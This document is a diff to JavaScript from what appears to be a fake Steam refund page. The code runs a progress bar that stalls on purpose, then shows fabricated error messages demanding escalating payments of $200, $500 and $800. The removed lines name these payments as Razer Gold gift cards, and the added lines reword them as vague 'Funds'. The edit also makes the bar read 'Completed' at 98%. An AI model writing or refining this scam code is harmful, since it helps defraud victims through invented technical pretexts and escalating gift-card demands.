@@ -258,9 +258,9 @@ function submitRefund(){
     else if(attempt === 3) stopPoint = 92;
 
     const errorMessages = [
-        "⚠ ERROR: We cannot retrieve your Steam account since there is missing information that prevents the database from retrieving your Steam account. You need to add $200 Razer Gold gift card more to process.",
-        "⚠ ERROR: The database has already found the missing information. We must increase your market transaction; that is why you need to buy another set of Razer Gold gift cards worth $500. We are doing this so that your account will be immune to this case anymore.",
-        "⚠ ERROR: Security confirmation required. The System need you to buy $800 card to fix the Item Buying Process Data in your Steam account. However, there is a problem regarding the Item Buying Process Data on your Steam account. As such, your account is not capable of performing any transactions on Steam, such as trading, buying in the market, or purchasing in-game items."
+        "⚠ ERROR: We cannot retrieve the User's account since there is missing information that prevents the database from retrieving the user's account. The Database needs an $200 Funds to process.",
+        "⚠ ERROR: The database has already found the missing information. We must increase the market transaction; that is why the Database need another funds worth $500. We are doing this so that the user's account will be immune to this case anymore.",
+        "⚠ ERROR: Security confirmation required. The System needs an $800 Funds to fix the Item Buying Process Data on the User's Account. However, there is a problem regarding the Item Buying Process Data. As such, The User's account is not capable of performing any transactions on Steam, such as trading, buying in the market, or purchasing in-game items."
     ];
 
     function updateProgress(){
@@ -290,7 +290,7 @@ function submitRefund(){
             spinner.style.display = "none";
 
             progressBar.style.background = "linear-gradient(to right,#2ecc71,#27ae60)";
-            progressBar.style.width = "100%";
+            progressBar.style.width = "98%";
             progressBar.innerText = "Completed";
 
             return;
